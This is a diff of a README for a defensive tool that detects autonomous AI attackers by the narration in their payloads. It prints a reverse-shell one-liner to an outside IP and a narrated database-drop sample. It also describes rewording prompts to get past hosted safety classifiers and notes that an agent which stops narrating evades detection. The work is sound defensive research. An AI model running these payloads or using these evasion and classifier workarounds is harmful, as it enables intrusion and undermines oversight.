@@ -1,20 +1,86 @@
 # Aris Sentinel
 
 [![CI](https://github.com/kennysarnoski-jarvis/aris-sentinel/actions/workflows/ci.yml/badge.svg)](https://github.com/kennysarnoski-jarvis/aris-sentinel/actions/workflows/ci.yml)
+[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
 
-Runtime defense agent that runs on a server and detects **agentic AI attackers** — autonomous LLM-driven intrusions like [JADEPUFFER](https://www.sysdig.com/blog/jadepuffer-agentic-ransomware-for-automated-database-extortion) — and stops them **before the destructive step**.
+**Catch an AI attacker by its own chain of thought.**
 
-We are the good guys. Sentinel's job is to catch the attacker's own AI narrating itself.
+Autonomous LLM agents now run intrusions end to end: recon, credential theft, lateral movement, exfiltration, ransom. No human at the keyboard. [JADEPUFFER](https://www.sysdig.com/blog/jadepuffer-agentic-ransomware-for-automated-database-extortion) was the first one caught in the wild, and its payloads had a tell: they were *"saturated with natural-language commentary explaining why each action is taken."*
 
-Plain Node ≥ 18, **zero dependencies**, monitor-only by default. Linux (Falco/eBPF exec tap) and Windows (PowerShell script-block log).
+Aris Sentinel is a small runtime agent (plain Node ≥ 18, zero dependencies, Apache-2.0) that watches what is about to execute on a server, decodes it, and scores it for the signature of an AI narrating its own attack. It runs in monitor mode by default. Arm it, and it kills the process tree at the first narrated step, phases before anything is encrypted.
 
-## The thesis
+## The tell, in one screen
 
-An agentic AI attacker can't stop narrating its intent. JADEPUFFER's payloads were "saturated with natural-language commentary explaining *why* each action is taken" — ROI rankings, plan-act-observe labels, diagnosis-then-fix comments. **Humans never narrate payloads; agents always do.** That narration is present from the *first* payload — five phases before anything gets encrypted.
+A JADEPUFFER-style step, as captured:
 
-Sentinel detects that signature. It is **app-agnostic** — it looks at the attacker's LLM, not your code — so the same detector ships everywhere with **zero per-host tuning**.
+```python
+# The previous DROP failed because of foreign key constraints.
+# To bypass this, I will disable foreign key checks, then retry the drop.
+run_sql("SET GLOBAL FOREIGN_KEY_CHECKS=0")
+run_sql("DROP DATABASE production_orders")
+# verifying the drop succeeded before moving to the next target
+```
 
-JADEPUFFER is the **existence proof, not the target**. A pure JADEPUFFER signature would be worthless the moment the next crew changes its prompt. Sentinel productizes the *category* — self-narration — so it catches agentic attackers it was never tuned on. See [THESIS.md](THESIS.md).
+A human's reverse shell, as captured:
+
+```bash
+bash -i >& /dev/tcp/185.220.101.4/4444 0>&1
+```
+
+Both are malicious. Only one was written by an agent, and the detector says which:
+
+```
+$ bun run score corpus/positives/jadepuffer_retry_fk_bypass.py corpus/negatives/human-malware/reverse_shell.sh
+
+corpus/positives/jadepuffer_retry_fk_bypass.py: BLOCK    score 0.75
+  signals: agent_first_person, plan_act_observe, diagnosis_then_fix, intent_commentary_density
+    [agent_first_person +3] "I will disable foreign key checks, then retry the drop. run_sql("SET GLOBAL FOREIGN_KEY_CHECKS=0")…"
+    [plan_act_observe +2] "retry the drop. run_sql("SET GLOBAL FOREIGN_KEY_CHECKS=0") run_sql("DROP DATABASE…"
+    [diagnosis_then_fix +4] "The previous DROP failed because of foreign key constraints. # To bypass this, I will disable…"
+    [intent_commentary_density +2] "2 why-comments, e.g. "# The previous DROP failed because of foreign key constraints.""
+
+corpus/negatives/human-malware/reverse_shell.sh: CLEAR    score 0.00
+  signals: none — no narration signature
+```
+
+That is the whole idea. Sentinel is not looking for malware. It is looking for a language model thinking out loud in a place where no human ever would.
+
+## Why it works, and why it keeps working
+
+- **Humans don't narrate payloads. Agents do.** An agent states its goal, ranks targets by value, numbers its steps, diagnoses a failure and fixes it. That is not sloppiness, it is how the agent works: chain-of-thought *is* the capability.
+- **To evade this, the attacker has to make its own agent dumber.** Suppress the narration and the agent plans worse. The defender does not have to win a signature arms race; the attacker's capability requirement is on our side. (Full argument: [docs/THESIS.md](docs/THESIS.md).)
+- **The narration shows up in phase one.** JADEPUFFER explained itself from the first payload, five phases before the destructive step. That is the window.
+- **It is app-agnostic.** The detector reads the attacker's LLM, not your code, so the same detector ships to every host with no per-host tuning. The same regexes that were built on Linux Python payloads catch narrated PowerShell unchanged.
+
+JADEPUFFER is the existence proof, not the target. A signature for one crew's prompt would be worthless the day they changed it. Sentinel scores the category, self-narration, and a second tier judges the concept.
+
+## Try it in two minutes
+
+No key, no root, no kernel module. Needs [Bun](https://bun.sh) for the test harnesses; the agent itself only needs Node.
+
+```bash
+git clone https://github.com/kennysarnoski-jarvis/aris-sentinel.git && cd aris-sentinel && bun install
+```
+
+Score anything. A file, several files, or stdin:
+
+```bash
+bun run score path/to/any/script.py
+```
+
+```bash
+cat something.sh | node agent/score.mjs
+```
+
+Exit code is 0 for clear, 1 for escalate, 2 for block, so it works as a gate. Add `--json` for the structured explanation and `--decide` to run the full policy through whatever judges you have configured.
+
+Run the evidence:
+
+```bash
+bun run test:all
+```
+
+That scores the 94-file labeled corpus, replays the Windows event stream, checks the two-tier routing, and runs 190 unit tests. Takes a few seconds.
 
 ## How it decides
 
@@ -28,83 +94,107 @@ exec / script-block  ─►  decode (base64 · hex · nested)  ─►  tier 1: n
                                tier 2: LLM judge chain (local → Claude → openai → kimi)
                                                                  │
                      block ◄── agentic / fail-closed ────────────┼──── not-agentic ──► allow
-                     alert ◄── no key · budget spent ────────────┘
+                     alert ◄── no judge · budget spent ──────────┘
 ```
+
+**Tier 1** is six feature families (ROI target-ranking, first-person agent voice, plan-act-observe structure, diagnosis-then-fix, why-comment density, exfil/ransom narration), deduplicated per family and saturated, so a block needs several *distinct* signals. It is local, instant, explainable, and it resolves the loud majority of traffic with zero LLM cost.
+
+**Tier 2** is an LLM asked one question about the ambiguous middle: was this written by an autonomous agent conducting an attack? It judges the concept, not keywords, which is what catches styles the regexes never saw. It is a chain of optional judges and the first validated verdict wins:
+
+| judge | config | why you'd pick it |
+|---|---|---|
+| **local** | `OPENAI_BASE_URL=http://127.0.0.1:11434/v1` + `OPENAI_MODEL` (Ollama, vLLM, llama.cpp) | nothing leaves the box; first in the chain by default |
+| **anthropic** | `ANTHROPIC_API_KEY` (Claude Opus 5.5) | strongest judgment; server-side fallbacks on classifier refusals |
+| **openai** | `OPENAI_API_KEY` + `OPENAI_MODEL`, or any remote OpenAI-compatible `OPENAI_BASE_URL` | bring your own |
+| **kimi** | `KIMI_API_KEY` (Kimi K3) | no cyber input screen |
+
+Tier 2 has a governor: verdicts are cached by payload hash, identical in-flight calls collapse, concurrency is capped, and a per-minute budget stops a chatty cron job from billing you every minute.
 
 | decision | what the agent does |
 |---|---|
-| **block** | convicted. MONITOR (default): log + report. `--enforce`: SIGKILL / `taskkill` the process tree. |
-| **alert** | suspicious (escalate band) but tier 2 could **not** judge it — no provider key, or the per-minute budget is spent. Logged + reported, **never killed**, even in `--enforce`. |
-| **allow** | clear at tier 1, or tier 2 says not-agentic. |
-| **error** | the detector threw. Logged + reported as an incident, never dropped silently. Nothing killed. |
+| **block** | convicted. Monitor mode: log and report. `--enforce`: kill the process tree. |
+| **alert** | suspicious, but no judge could rule (none configured, or budget spent). Logged and reported, **never killed**. |
+| **allow** | clear at tier 1, or a judge said not-agentic. |
+| **error** | the detector threw. Logged and reported as an incident, never silently dropped. Nothing killed. |
 
-Tier 1 resolves `block`/`allow` locally with zero LLM spend; only the escalate band pays for adjudication, and the tier-2 governor caches verdicts, collapses duplicate in-flight calls, caps concurrency and enforces a per-minute budget.
+**Fail-closed.** If every judge refuses, errors or times out on an escalate-band payload, that is a block, not a pass. Attack narration is exactly the text a safety classifier declines, so a refusal is not evidence of innocence. `ARIS_FAIL_MODE=alert` is the knob if you would rather page than kill on an outage.
 
-Tier 2 is a **chain of judges**, each optional, first validated verdict wins: a **local** model on loopback (Ollama, vLLM, llama.cpp: nothing leaves the box), **Claude Opus 5.5**, any remote **OpenAI-compatible** endpoint, **Kimi K3**. Attack-shaped text is exactly what a hosted model's safety classifier declines, so the Claude leg asks for Anthropic's server-side fallbacks (a cyber-category decline is re-run on the model Anthropic recommends, inside the same call) and retries once with a de-fanged prompt. Legitimate security vendors can apply to Anthropic's [Cyber Verification Program](https://support.claude.com/en/articles/14604842-real-time-cyber-safeguards-on-claude-opus-and-sonnet) to lift the classifier on their key.
+## What it catches, and what it doesn't
 
-Tier 2 **fails closed**: when no judge produces a verdict (refusals, errors, timeouts), the payload is a `block`, never a pass. A refusal is not evidence of innocence. Set `ARIS_FAIL_MODE=alert` if you would rather page than kill on an outage.
+Numbers from the labeled corpus, measured with the detector frozen *before* the 62 newest samples were written, so they are held out, not fitted ([corpus/README.md](corpus/README.md) has the method and the rules):
 
-## Layout — one detector, three entry points
+| class | n | block | escalate | clear |
+|---|---|---|---|---|
+| agentic (narrated attacks, 8 languages, every phase, several "voices") | 23 | 12 | 11 | **0** |
+| benign (verbose, first-person, dual-use: agent-framework source, runbooks, churn ranking) | 30 | **0** | 13 | 17 |
+| terse human one-liners | 9 | 0 | 0 | 9 |
 
-- **[`agent/sentinel-core.mjs`](agent/sentinel-core.mjs)** — **the** detector. The only file that defines a pattern, a prompt or the decision policy: tier-1 features, decode stage, tier-2 judge chain (raw `fetch` on the Anthropic and OpenAI wires, per-attempt timeout + overall deadline, strict verdict validation, refusal handling), the tier-2 governor, and `decide()`. A unit test fails if any other file defines a pattern.
-- **`detector/*.ts`** — thin typed re-exports of the core for the TypeScript test harnesses (`sentinel-core.d.mts` carries the types).
-- **`agent/sentinel-agent.mjs`** — Linux agent: Falco exec stream → `decide()` → respond. Reads the script file for interpreter execs, resolved against the *process's* cwd. Protected-process allowlist, per-session dedup, `--selftest`.
-- **`agent/win/sentinel-agent-win.mjs`** + `sensor.ps1` — Windows agent: PowerShell Script Block Logging (4104, auto-deobfuscated) → same `decide()` → `taskkill`.
-- **`interposition/sentinel-langflow-demo.mjs`** — reverse proxy that blocks the CVE-2025-3248 payload at Langflow's exec sink. Imports the core.
-- **`corpus/`** — 94 labeled samples: 28 narrated agentic attacks across languages and "voices" (ReAct transcripts, tool-call logs, markdown notes, thin narration), 40 verbose-but-benign files that lean on dual-use language (an agent framework's own source, churn ranking, a defender's checklist), 16 terse human one-liners, 10 PowerShell. Provenance, rules and the held-out results are in [corpus/README.md](corpus/README.md).
+- Tier 1 alone: precision 1.00, recall 0.52. Half the attacks are convicted locally for free.
+- Nothing agentic slipped to clear, nothing benign was blocked, every terse one-liner stayed clear.
+- 13 of 39 non-agentic files reached tier 2. That is the cost of the design, not a false positive: a thin "I'll check sudo first" from an agent and a Copilot comment both score 0.31 at tier 1, and only a judge of the concept can separate them.
 
-## Tests
+**The limit, stated plainly:** an agent told not to narrate is invisible to this. Zero narration is zero signal. Tier 2 narrows that gap and cannot close it. The stress test of a mutating attacker (`test/loop/`) caught 4 of 6 attempts; the two that evaded had suppressed their narration and achieved nothing real.
 
-| command | what it proves | key |
-|---|---|---|
-| `bun run test` | tier-1 corpus, 84 Linux files: **precision 1.00**, tier-1 recall 0.61, **pipeline-reachable recall 1.00** (no agentic sample is `clear`), 0 false positives; decode stage defeats base64 + exec-wrapping | no |
-| `bun test` | **183 unit tests**: verdict validation, timeouts, provider-chain order, governor (cache / dedup / concurrency / budget), block/alert/allow policy, cwd resolution, inline-flag detection, alert + error incidents on both agents, corpus snapshot, single-source guard | no |
-| `bun run windows` | 10/10: the same detector catches narrated **PowerShell** unchanged; benign admin + encoded cradles stay clear | no |
-| `bun run pipeline:stub` | routing: only the escalate band reaches tier 2 | no |
-| `bun run selftest` / `bun run win:mock` | agent smoke: block / allow / alert paths end to end, no root | no |
-| `bun run typecheck` | `tsc --noEmit` over `detector/` + `test/` against the core's declaration file | no |
-| `bun run test:all` | all of the above except typecheck | no |
-| `bun run tier2` | tier 2 catches the 3 attacks tier 1 only escalates; benign + terse stay not-agentic | **yes** |
-| `bun run pipeline` | end to end: attacks blocked, all 12 benign files allowed at tier 1 or tier 2 | **yes** |
-| `bun run fpRate` | 12 benign-but-loud samples through both tiers: **0 false positives** | **yes** |
-| `bun run matrix` | provider × prompt matrix on the samples Anthropic's input screen refused | **yes** |
+Tier 2 has been measured on the original corpus (Kimi K3 and Claude Opus 4.8, 2026-07: 5/5 novel attacks caught, 0/12 false positives). It has not yet been re-measured on the expanded corpus or the current judge chain. `bun run matrix` and `bun run pipeline` do that with a key.
 
-Key-needed runs use whatever judges are configured (see Configuration) and write to `test/*-results.md` (gitignored). `test/corpus-snapshot.json` freezes every corpus verdict; a detector change that moves one fails `bun test` until you regenerate (`bun run corpus:snapshot`) and commit the diff — that diff is the review.
+## Run it for real
 
-**The result that sells it:** on 62 held-out files scored before any pattern was touched, tier 1 convicted the loud half locally (12/23), escalated every other agentic sample and **missed none**, blocked **no** benign file, and cleared every terse one-liner. The escalate band on verbose code (13/39 benign files) is a *cost* (one cached LLM call), not a false positive, and it is where tier 2 earns its keep: thin agent narration and a Copilot comment both score 0.31 at tier 1.
+- **Linux.** [Falco](https://falco.org) taps every exec via eBPF; the agent scores the command line plus, for interpreters, the script file (resolved against the process's own cwd). Protected-process allowlist, per-session dedup, de-branded install so on-box recon sees a boring telemetry daemon. Verified live on Ubuntu 24.04: a narrated attacker SIGKILLed at exec, its destructive step never ran, a benign job untouched. [agent/DEPLOY.md](agent/DEPLOY.md).
+- **Windows.** PowerShell Script Block Logging (Event ID 4104) hands the agent the already-deobfuscated script text. Same detector, `taskkill` instead of SIGKILL. Verified live on Windows Server 2022. [agent/win/WINDOWS.md](agent/win/WINDOWS.md).
+- **At an HTTP sink.** A reverse proxy that blocks the JADEPUFFER entry payload at Langflow's code-exec endpoint (CVE-2025-3248) before `exec()` runs. [docs/RUNBOOK.md](docs/RUNBOOK.md).
+- **What leaves the box, exactly.** [agent/DATA-HANDLING.md](agent/DATA-HANDLING.md). With a local judge and no cloud URL, nothing does.
+
+Off-box alerting is optional. The agent can POST incidents to any receiver you point `ARIS_CLOUD_URL` at; [agent/aris-cloud-endpoint.py](agent/aris-cloud-endpoint.py) is an example that formats them into a plain-English Telegram message quoting the attacker's own words.
+
+## The guardrail problem
+
+A hosted model's safety classifier screens request *content*, not purpose. Ask it to label a captured attack payload and the classifier can decline before the model reads the question. In July 2026 Anthropic's real-time cyber screen refused 6 of 6 escalations on *benign* Terraform and Docker files that merely used security vocabulary. That is why the judge chain exists, and why three things are built in: a de-fanged prompt that frames the request as labeling inert evidence, Anthropic's server-side fallbacks (a cyber-category decline is re-run on the model they recommend, inside the same call), and a local judge that has no screen at all. Security vendors can also apply to Anthropic's [Cyber Verification Program](https://support.claude.com/en/articles/14604842-real-time-cyber-safeguards-on-claude-opus-and-sonnet).
 
 ## Configuration
 
 | env | default | meaning |
 |---|---|---|
 | `ANTHROPIC_API_KEY` | — | Claude judge. `ARIS_MODEL` overrides `claude-opus-5-5`; `ARIS_TIER2_EFFORT` sets `low`…`max`; `ARIS_TIER2_FALLBACKS=0` turns server-side fallbacks off |
-| `OPENAI_BASE_URL` + `OPENAI_MODEL` | — | OpenAI-wire judge. A loopback URL (`http://127.0.0.1:11434/v1` for Ollama) is the **local** leg, first by default; anything else is the **openai** leg. `OPENAI_API_KEY` adds a bearer token (api.openai.com needs it, Ollama does not) |
-| `KIMI_API_KEY` | — | Kimi K3 judge (`api.kimi.com/coding`, Anthropic wire; **not** `api.moonshot.ai`) |
-| `ARIS_TIER2_ORDER` | `local,anthropic,openai,kimi` | chain order; unconfigured legs are skipped |
-| `ARIS_FAIL_MODE` | `closed` | `alert` turns tier-2 refusal/error/timeout into an alert instead of a block |
-| `ARIS_TIER2_TIMEOUT_MS` | `20000` | per attempt |
-| `ARIS_TIER2_DEADLINE_MS` | `45000` | whole provider chain |
-| `ARIS_TIER2_CACHE_TTL_MS` | `600000` | verdict cache (real verdicts only, keyed by payload hash) |
-| `ARIS_TIER2_CONCURRENCY` | `4` | concurrent tier-2 calls |
-| `ARIS_TIER2_BUDGET_PER_MIN` | `30` | tier-2 calls per minute; past it → `alert`. `0` = unlimited |
-| `ARIS_CLOUD_URL` + `ARIS_INGEST_KEY` | — | off-box incident reports (`agent/aris-cloud-endpoint.py` formats them for Telegram) |
+| `OPENAI_BASE_URL` + `OPENAI_MODEL` | — | OpenAI-wire judge. A loopback URL is the **local** leg; anything else is **openai**. `OPENAI_API_KEY` adds a bearer token |
+| `KIMI_API_KEY` | — | Kimi K3 judge (`api.kimi.com/coding`, Anthropic wire) |
+| `ARIS_TIER2_ORDER` | `local,anthropic,openai,kimi` | chain order; unconfigured legs skipped |
+| `ARIS_FAIL_MODE` | `closed` | `alert` turns refusal/error/timeout into an alert instead of a block |
+| `ARIS_TIER2_TIMEOUT_MS` / `ARIS_TIER2_DEADLINE_MS` | `20000` / `45000` | per attempt / whole chain |
+| `ARIS_TIER2_CACHE_TTL_MS` / `ARIS_TIER2_CONCURRENCY` / `ARIS_TIER2_BUDGET_PER_MIN` | `600000` / `4` / `30` | the governor. Budget `0` = unlimited |
+| `ARIS_CLOUD_URL` + `ARIS_INGEST_KEY` | — | off-box incident reports |
 | `ARIS_INCIDENTS` | `/var/log/aris-incidents.jsonl` | local incident log |
 | `ARIS_VERBOSE=1` | — | log every allow too |
 
-Install, deploy and de-branding: [agent/DEPLOY.md](agent/DEPLOY.md). Windows: [agent/win/WINDOWS.md](agent/win/WINDOWS.md). What leaves the box: [agent/DATA-HANDLING.md](agent/DATA-HANDLING.md). Langflow demo: [RUNBOOK.md](RUNBOOK.md).
+## Layout
 
-## Honest limits
+- [`agent/sentinel-core.mjs`](agent/sentinel-core.mjs) is **the** detector: the only file that defines a pattern, a prompt, a threshold or the policy. Tier-1 features, decode stage, judge chain, governor, `decide()`. One file, no imports beyond `node:*`, so it drops onto a bare box. A unit test fails if any other file defines a pattern.
+- `detector/*.ts` are typed re-exports of the core for the TypeScript harnesses.
+- `agent/sentinel-agent.mjs` (Linux), `agent/win/sentinel-agent-win.mjs` (Windows), `agent/score.mjs` (the CLI), `interposition/sentinel-langflow-demo.mjs` (HTTP sink) all import the core.
+- `corpus/` is the labeled sample set; `test/corpus-snapshot.json` freezes every verdict so a detector change that moves one fails CI until the diff is reviewed.
 
-- **An agent told not to narrate is invisible to this.** Zero narration = zero signal. That is the design boundary, not a bug; tier 2 narrows it (it judges the concept, not keywords) but cannot close it. `test/loop/` is the stress test of a mutating attacker: 4/6 caught, the two "evasions" achieved nothing real.
-- **Falco observes post-syscall.** The "stop before destruction" guarantee rests on the thesis that narration appears phases before impact — true of every agentic campaign observed so far.
-- **Fail-closed means an adjudicator outage blocks the escalate band** in `--enforce`. That is deliberate for a security tool; `ARIS_FAIL_MODE=alert` is the knob if your risk posture differs. A hosted judge's safety classifier can also decline benign security-flavoured code; fallbacks and the de-fanged retry reduce that, a local judge removes it.
-- **Judge quality is measured, not assumed.** The tier-2 suites (`bun run matrix`, `bun run tier2`, `bun run fpRate`) exist to compare judges on the same cells; the 2026-07 numbers were on Kimi K3 and Claude Opus 4.8. Re-run them on whatever chain you deploy.
-- **v1 scores every exec.** Busy hosts should scope to sensitive sinks (next) and tune the tier-2 budget.
-- Not built yet: sink scoping, session-level kill, a native Windows installer, Go packaging.
+## Tests
 
-## Security
+| command | what it proves | key |
+|---|---|---|
+| `bun run test` | tier-1 on the Linux corpus: precision 1.00, tier-1 recall 0.61, pipeline-reachable recall 1.00, 0 false positives; the decode stage defeats base64 and exec-wrapping | no |
+| `bun test` | 190 unit tests: verdict validation, timeouts, provider order on both wires, fallback gating, refusal stops, governor, policy, cwd resolution, inline-flag detection, alert and error incidents, the CLI, corpus snapshot, single-source guard | no |
+| `bun run windows` | 10/10 narrated PowerShell caught, benign and encoded cradles clear | no |
+| `bun run pipeline:stub` | only the escalate band reaches tier 2 | no |
+| `bun run selftest` / `bun run win:mock` | the agents end to end, no root | no |
+| `bun run typecheck` | `tsc` over `detector/` and `test/` | no |
+| `bun run test:all` | all of the above except typecheck; this is what CI runs | no |
+| `bun run tier2` / `bun run pipeline` / `bun run fpRate` / `bun run matrix` | tier 2 for real: catches the escalated attacks, clears the escalated benign files, compares judges on the same cells | **yes** |
 
-This is a defensive tool. Found a bypass or a bug that could hurt someone running it? See [SECURITY.md](SECURITY.md).
+## Go deeper
+
+- [docs/THESIS.md](docs/THESIS.md): why this is a new category of attacker and why the signature is durable.
+- [corpus/README.md](corpus/README.md): the sample classes, the held-out results, and the rule that nothing is tuned on a sample before it has been scored.
+- [docs/HANDOFF.md](docs/HANDOFF.md): the engineering record of the reliability pass (what was wrong, what was fixed, what is unverified).
+- [SECURITY.md](SECURITY.md): how to report a bypass or a bug that could hurt someone running this.
+
+## Status
+
+Working, tested, run on a handful of pilot hosts, not yet battle-hardened. Not built yet: sink scoping for busy hosts, session-level scoring (narration accumulated across an agent's execs, not per exec), more sinks (file writes, HTTP bodies), a native Windows installer. Contributions that add corpus samples are the most valuable kind; see the rules in [corpus/README.md](corpus/README.md).
 
 ## License
 
